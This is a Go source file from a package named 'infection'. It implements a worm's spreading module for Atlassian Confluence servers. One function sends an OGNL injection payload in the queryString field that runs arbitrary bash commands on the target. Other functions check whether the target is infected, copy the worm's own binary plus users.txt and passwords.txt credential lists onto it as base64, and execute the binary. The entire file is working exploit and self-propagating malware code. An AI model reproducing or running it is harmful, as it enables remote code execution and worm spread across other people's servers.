package infection

import (
	"io/ioutil"
	"log"
	"net/http"
  "net/url"
	"strings"
	"encoding/base64"
	"fmt"
)


func ConfluenceCmdExecute(targetUrl string, endpoint string, cmd string) string {

  exploitUrl := targetUrl + endpoint

  postData := make(url.Values)
  postData.Add("queryString", "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var cmd = new java.lang.String(\\u0022" + cmd + "\\u0022);var p = new java.lang.ProcessBuilder(); p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027")

  response, err := http.PostForm(exploitUrl, postData)

  if err != nil {
    log.Fatal("An Error Occured %v", err)
  }

  defer response.Body.Close()

  body, err := ioutil.ReadAll(response.Body)
  if err != nil {
    log.Fatal(err)
  }
  sb := string(body)

  log.Println(sb)

  return sb
  }

	func ConfluenceCheckInfection(url string, endpoint string) bool {
		command := fmt.Sprintf("test -f %s && echo wormHere", wormPath)
		resp := ConfluenceCmdExecute(url, endpoint, command)
		return strings.Contains(resp, "wormHere")
	}

	func ConfluenceInfect(url string, endpoint string) bool {
		var worm []byte
		var copyTemplate string

		copyTemplate = "echo %s | base64 -d | tee %s"

		worm = GetFile("/proc/self/exe")
		worm64 := base64.StdEncoding.EncodeToString(worm)
		command := fmt.Sprintf(copyTemplate, worm64, wormPath)
		ConfluenceCmdExecute(url, endpoint, command)

		usersFile := GetFile("./users.txt")
		usersFile64 := base64.StdEncoding.EncodeToString(usersFile)
		command = fmt.Sprintf(copyTemplate, usersFile64, "/tmp/users.txt")
		ConfluenceCmdExecute(url, endpoint, command)

		passwordFile := GetFile("./passwords.txt")
		passwordFile64 := base64.StdEncoding.EncodeToString(passwordFile)
		command = fmt.Sprintf(copyTemplate, passwordFile64, "/tmp/passwords.txt")
		ConfluenceCmdExecute(url, endpoint, command)

		command = fmt.Sprintf("chmod u+x %s && %s", wormPath, wormPath)
		ConfluenceCmdExecute(url, endpoint, command)

		return ConfluenceCheckInfection(url, endpoint)
	}
